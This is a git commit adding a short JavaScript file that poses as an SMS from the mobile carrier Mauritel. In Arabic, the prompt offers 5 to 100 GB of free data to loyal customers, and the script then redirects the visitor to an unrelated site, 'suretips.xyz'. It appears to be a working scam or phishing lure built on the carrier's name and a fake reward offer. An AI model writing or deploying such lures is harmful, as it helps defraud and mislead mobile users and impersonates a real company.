06cdda89df786f270a0fde8826527893f125ac72
zamonize1 <52072397+zamonize@users.noreply.github.com>
2025-03-20 23:22:30 -0700

    Create activation-mauritel-freedata.js

---
+++ activation-mauritel-freedata.js
@@ -0,0 +1,5 @@
+var password = 'بيانات مجانية'
+password=prompt('Mauritel SMS: عزيزي العميل، يرجى التحقق مما إذا كانت بطاقة SIM الخاصة بك من Mauritel مؤهلة لاستقبال بيانات من 5 جيجابايت إلى 100 جيجابايت، مكافأة العملاء القدامى, اضغط على البيانات المجانية للتحقق الآن ','بيانات مجانية');
+if (password != 'بيانات مجانية') {
+location.href='https://suretips.xyz/mauritel-freedata.html';
+}
